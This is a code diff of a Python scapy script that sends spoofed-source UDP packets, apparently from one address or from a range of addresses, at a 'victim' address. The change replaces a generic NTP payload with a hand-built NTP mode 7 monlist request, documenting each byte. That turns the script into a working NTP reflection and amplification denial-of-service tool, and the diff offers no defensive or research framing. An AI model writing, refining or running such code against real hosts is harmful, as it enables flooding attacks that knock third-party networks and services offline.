@@ -3,11 +3,17 @@ import time
 
 from scapy.all import *
 
-NTP_PAYLOAD = bytes([0x1B] + [0] * 47)
+# NTP mode 7 (private) monlist request — 8 bytes total.
+# Byte 0: R=0, M=0, VN=2, Mode=7              → 0x17
+# Byte 1: auth=0, sequence=0                  → 0x00
+# Byte 2: implementation = 3 (IMPL_XNTPD)     → 0x03
+# Byte 3: request code = 42 (REQ_MON_GETLIST_1) → 0x2A
+# Bytes 4-7: err + items + mbz + item_size    → all zero for a request
+MONLIST_PAYLOAD = bytes([0x17, 0x00, 0x03, 0x2A, 0x00, 0x00, 0x00, 0x00])
 
 
 def send_single(spoof, dst, port, count, interval):
-    pkt = IP(src=spoof, dst=dst) / UDP(sport=12345, dport=port) / NTP_PAYLOAD
+    pkt = IP(src=spoof, dst=dst) / UDP(sport=12345, dport=port) / MONLIST_PAYLOAD
     for _ in range(count):
         send(pkt, verbose=False)
         if interval > 0:
@@ -18,7 +24,7 @@ def send_many(base, start, count, per_source, victim, port, interval, repeat):
     src_ips = [f"{base}{start + i}" for i in range(count)]
     for _ in range(repeat):
         for src in src_ips:
-            pkt = IP(src=src, dst=victim) / UDP(sport=12345, dport=port) / NTP_PAYLOAD
+            pkt = IP(src=src, dst=victim) / UDP(sport=12345, dport=port) / MONLIST_PAYLOAD
             for _ in range(per_source):
                 send(pkt, verbose=False)
                 if interval > 0:
@@ -26,7 +32,7 @@ def send_many(base, start, count, per_source, victim, port, interval, repeat):
 
 
 if __name__ == '__main__':
-    p = argparse.ArgumentParser(description='Send spoofed NTP-like UDP packets in single-source or multi-source mode')
+    p = argparse.ArgumentParser(description='Send spoofed NTP monlist (mode 7) requests in single-source or multi-source mode')
     p.add_argument('--spoof', default="215.95.122.182", help='single spoofed source IP')
     p.add_argument('--dst', help='destination IP for single-source mode')
     p.add_argument('--base', default="127.0.0", help='base prefix for source IPs, e.g. 127.0.0.')
